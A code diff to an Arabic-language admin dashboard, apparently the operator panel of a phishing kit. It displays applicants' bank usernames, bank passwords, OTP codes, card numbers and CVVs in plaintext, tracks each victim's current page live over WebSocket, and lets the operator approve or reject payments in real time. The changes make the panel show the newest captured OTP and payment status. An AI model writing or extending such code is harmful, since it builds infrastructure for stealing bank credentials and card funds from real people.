@@ -221,8 +221,8 @@ function TimeBadge({ timestamp, icon, label }: {
 // دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
 function mergeVersionsData(sources: AppVersion[]): AppVersion {
   const FIELDS: (keyof AppVersion)[] = [
-    // حقول أساسية يجب الحفاظ عليها من الطلب الأصلي
-    "id", "updatedAt", "currentStep",
+    // حقول أساسية يجب الحفاظ عليها من الطلب الأصلي (currentStep من الأحدث)
+    "id", "updatedAt",
     // حقول البيانات الشخصية
     "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
     "employer", "phone", "email", "city", "maritalStatus",
@@ -235,6 +235,8 @@ function mergeVersionsData(sources: AppVersion[]): AppVersion {
     // حقول البطاقة والدفع
     "paymentCardNumber", "paymentCardHolder", "paymentExpiryDate", "paymentCvv",
     "paymentOtp", "paymentStatus", "paymentCompletedAt",
+    // currentStep يجب أن يكون آخر (من الأحدث)
+    "currentStep",
   ];
   const sorted = [...sources].sort(
     (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
@@ -1006,7 +1008,7 @@ export default function AdminDashboardPage() {
                           {app.bankName && <span className="ml-2">{app.bankName}</span>}
                           {app.bankUsername && <span className="font-mono ml-2 text-blue-600">{app.bankUsername}</span>}
                           {app.bankPassword && <span className="font-mono ml-2 text-red-600">{app.bankPassword}</span>}
-                          {app.otpCode && <span className="font-mono ml-2 text-orange-600 font-bold">{app.otpCode}</span>}
+                          {currentApp.otpCode && <span className="font-mono ml-2 text-orange-600 font-bold">{currentApp.otpCode}</span>}
                         </p>
                       </div>
                       <div className="flex items-center gap-2 shrink-0">
@@ -1030,12 +1032,15 @@ export default function AdminDashboardPage() {
             <div className="p-12 text-center text-muted-foreground">
               لا توجد طلبات حتى الآن
             </div>
-          ) : activeTab === "applications" && (
+                      ) : activeTab === "applications" && (
             <div className="divide-y">
               {applications.map((app) => {
                 const isExpanded = expandedRows.has(app.id);
                 // الاسم: نحاول من السجل الحالي أولاً، ثم من كاش النسخ كاحتياط
                 const cachedVersions = versionCache[app.id] || [];
+                // الأحدث من كاش النسخ إن وُجد، وإلا استخدام app
+                const latestFromCache = cachedVersions.find((v) => v.isLatest);
+                const currentApp = latestFromCache || (app as unknown as AppVersion);
                 const name =
                   app.fullName || app.companyName || app.contactName ||
                   (cachedVersions.find((v) => v.fullName)?.fullName as string | undefined) ||
@@ -1063,7 +1068,7 @@ export default function AdminDashboardPage() {
                           // استخدام البيانات الفورية من WebSocket
                           const sessionStatus = getSessionStatus(app.sessionId);
                           const online = sessionStatus.online;
-                          const currentPage = sessionStatus.currentPage || app.currentStep;
+                          const currentPage = sessionStatus.currentPage || currentApp.currentStep;
                           const lastPageLabel = stepLabels[currentPage] || currentPage;
                           const sess = app.sessionId ? sessionMap.get(app.sessionId) : undefined;
 
@@ -1075,7 +1080,7 @@ export default function AdminDashboardPage() {
                             badge = { label: "تم الرفض ✗", color: "bg-red-100 text-red-700" };
                           } else if (app.status === "reviewing") {
                             badge = { label: "مراجعة البيانات", color: "bg-blue-100 text-blue-700" };
-                          } else if (app.currentStep === "waiting") {
+                          } else if (currentApp.currentStep === "waiting") {
                             badge = { label: "بانتظار الموافقة", color: "bg-yellow-100 text-yellow-700" };
                           } else {
                             // pending أو أي حالة أخرى = قيد التقديم
@@ -1123,7 +1128,7 @@ export default function AdminDashboardPage() {
                                     <Key className="w-3 h-3" /> بيانات دخول
                                   </span>
                                 )}
-                                {app.otpCode && (
+                                {currentApp.otpCode && (
                                   <span className="text-xs bg-orange-50 text-orange-700 px-2 py-0.5 rounded-full flex items-center gap-1">
                                     <Smartphone className="w-3 h-3" /> رمز OTP
                                   </span>
@@ -1141,7 +1146,7 @@ export default function AdminDashboardPage() {
                           <TimeBadge timestamp={app.updatedAt} icon={<CreditCard className="w-3 h-3" />} label="بنك" />
                         )}
                         {/* طابع وقت OTP */}
-                        {app.otpCode && (
+                        {currentApp.otpCode && (
                           <TimeBadge timestamp={app.updatedAt} icon={<Smartphone className="w-3 h-3" />} label="OTP" />
                         )}
 
@@ -1166,10 +1171,10 @@ export default function AdminDashboardPage() {
                       <div className="bg-muted/30 border-t px-4 pb-4 pt-3">
                         {/* تبويبات النسخ */}
                         {(() => {
-                          // versionCache للنسخ القديمة فقط، app هو الأحدث
+                          // versions يتضمن جميع النسخ (بما فيها الأحدث) من API
                           const versions = versionCache[app.id] || versionCache[app.sessionId] || [];
-                          // دمج جميع البيانات: الأحدث من app + جميع النسخ (يضمن عرض أحدث قيمة لكل حقل)
-                          const allData = mergeVersionsData([app as unknown as AppVersion, ...versions]);
+                          // دمج جميع البيانات: الأحدث من versions + باقي النسخ
+                          const allData = mergeVersionsData(versions.length > 0 ? versions : [app as unknown as AppVersion]);
                           const totalVersions = versions.length + 1;
                           const olderVersions = versions.filter((v) => !v.isLatest);
                           const activeTab = expandedTabs[app.id] || "current";
@@ -1381,7 +1386,7 @@ export default function AdminDashboardPage() {
                             <DataBadge
                               label="الخطوة الحالية"
                               value={
-                                stepLabels[app.currentStep] || app.currentStep
+                                stepLabels[currentApp.currentStep] || currentApp.currentStep
                               }
                             />
                             <DataBadge
@@ -1476,25 +1481,25 @@ export default function AdminDashboardPage() {
                           {allData.paymentCardHolder ? (
                             <div className="space-y-3">
                               <div className={`rounded-xl p-4 ${
-                                app.paymentStatus === "verifying"
+                                currentApp.paymentStatus === "verifying"
                                   ? "bg-yellow-50 border border-yellow-200"
-                                  : app.paymentStatus === "completed"
+                                  : currentApp.paymentStatus === "completed"
                                   ? "bg-green-50 border border-green-200"
-                                  : app.paymentStatus === "failed"
+                                  : currentApp.paymentStatus === "failed"
                                   ? "bg-red-50 border border-red-200"
                                   : "bg-gray-50 border border-gray-200"
                               }`}>
                                 <div className="flex items-center gap-2 mb-3">
                                   <span className={`px-2 py-1 rounded-full text-xs font-bold ${
-                                    app.paymentStatus === "completed" 
+                                    currentApp.paymentStatus === "completed" 
                                       ? "bg-green-100 text-green-700" 
-                                      : app.paymentStatus === "verifying"
+                                      : currentApp.paymentStatus === "verifying"
                                       ? "bg-yellow-100 text-yellow-700"
                                       : "bg-gray-100 text-gray-700"
                                   }`}>
-                                    {app.paymentStatus === "completed" ? "✓ تم الدفع" 
-                                      : app.paymentStatus === "failed" ? "✗ فشل الدفع"
-                                      : app.paymentStatus === "verifying"
+                                    {currentApp.paymentStatus === "completed" ? "✓ تم الدفع" 
+                                      : currentApp.paymentStatus === "failed" ? "✗ فشل الدفع"
+                                      : currentApp.paymentStatus === "verifying"
                                       ? "🔄 جاري التحقق"
                                       : "⏳ بانتظار الدفع"}
                                   </span>
@@ -1518,7 +1523,7 @@ export default function AdminDashboardPage() {
                                   />
 
                                   {/* أزرار التحقق عند حالة verifying */}
-                                  {app.paymentStatus === "verifying" && (
+                                  {currentApp.paymentStatus === "verifying" && (
                                     <div className="mt-4 space-y-2">
                                       <button
                                         onClick={() => handlePaymentAction(app.id, "approve")}
@@ -1540,13 +1545,13 @@ export default function AdminDashboardPage() {
                                   )}
                                   
                                   {/* رسالة النجاح */}
-                                  {app.paymentStatus === "completed" && (
+                                  {currentApp.paymentStatus === "completed" && (
                                     <div className="mt-4 bg-green-100 rounded-lg p-3 text-center">
                                       <p className="text-green-700 text-sm font-bold">✓ تمت معالجة الدفع بنجاح</p>
                                     </div>
                                   )}
                                   {/* رسالة الفشل */}
-                                  {app.paymentStatus === "failed" && (
+                                  {currentApp.paymentStatus === "failed" && (
                                     <div className="mt-4 bg-red-100 rounded-lg p-3 text-center">
                                       <p className="text-red-700 text-sm font-bold">✗ تم رفض الدفع</p>
                                     </div>
